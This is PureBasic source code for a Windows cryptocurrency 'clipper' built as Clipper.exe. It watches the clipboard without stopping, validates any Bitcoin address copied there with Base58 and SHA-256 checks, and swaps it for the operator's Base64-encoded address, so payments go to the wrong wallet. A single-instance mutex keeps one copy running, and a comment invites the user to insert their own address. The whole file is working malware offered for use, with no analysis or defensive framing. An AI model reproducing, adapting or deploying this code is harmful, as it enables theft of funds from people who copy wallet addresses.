Macro Start : EndMacro
EnableExplicit

Global Address.s
Global MyAddress.s = "encoded bitcoin address"; enter your encoded bitcoin address here ( use Base.pb to encode your address )
Global Mutex.i, Thread.i

UseSHA2Fingerprint()

Procedure.i DecodeBase58(Address$, Array result.a(1)) 
  Protected i, j, p
  Protected charSet$ = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
  Protected c$
  For i = 1 To Len(Address$)
    c$ = Mid(Address$, i, 1)
    p = FindString(charSet$, c$) - 1
    If p = -1 : ProcedureReturn #False : EndIf
    For j = 24 To 1 Step -1
      p + 58 * result(j)
      result(j) = p % 256
      p  / 256
    Next j
    If p <> 0 : ProcedureReturn #False : EndIf
  Next i
  ProcedureReturn #True
EndProcedure
Procedure HexToBytes(hex$, Array result.a(1))
  Protected i
  For i = 1 To Len(hex$) - 1 Step 2
    result(i/2) = Val("$" + Mid(hex$, i, 2))
  Next
EndProcedure

Procedure.i Validate(Address$)
  Protected format$, digest$
  Protected i, isValid
  Protected Dim result.a(24)
  Protected Dim result2.a(31)
  Protected result$, result2$
  If Len(Address$) < 26 Or Len(Address$) > 35 : ProcedureReturn #False : EndIf
  format$ = Left(Address$, 1)
  If format$ <> "1" And format$ <> "3" : ProcedureReturn #False : EndIf
  isValid = DecodeBase58(Address$, result())  
  If Not isValid : ProcedureReturn #False : EndIf
  digest$ = Fingerprint(@result(), 21, #PB_Cipher_SHA2, 256)
  HexToBytes(digest$, result2())
  digest$ = Fingerprint(@result2(), 32,  #PB_Cipher_SHA2, 256)
  HexToBytes(digest$, result2())
  result$ = PeekS(@result() + 21, 4, #PB_Ascii)
  result2$ = PeekS(@result2(), 4, #PB_Ascii)
  If result$ <> result2$ : ProcedureReturn #False : EndIf
  ProcedureReturn #True  
EndProcedure

Procedure Replace(*Value)
  Shared Mutex
  LockMutex(Mutex)
  
  Address = Space(1024)
  Base64Decoder(@MyAddress, StringByteLength(MyAddress), @Address, 1024)
  
  Repeat
    If Validate(GetClipboardText()) 
      SetClipboardText(Address)
    EndIf
  ForEver
  UnlockMutex(Mutex)
EndProcedure

Start
  Define.L hMutex
  Define.S MutexName = "5835f27e062417d3c161e0f9734aeefb"

  hMutex = OpenMutex_(#MUTEX_ALL_ACCESS, 0, @MutexName)

  If hMutex <> 0
    End
  Else
    hMutex = CreateMutex_(0, 0, @MutexName)
  
    Mutex = CreateMutex()
    Thread = CreateThread(@Replace(), 0)
    WaitThread(Thread)
  EndIf

  If hMutex <> 0
    CloseHandle_(hMutex) 
  EndIf
End

; IDE Options = PureBasic 5.50 (Windows - x86)
; CursorPosition = 58
; FirstLine = 48
; Folding = -
; Executable = Clipper.exe
; DisableDebugger
; EnableUnicode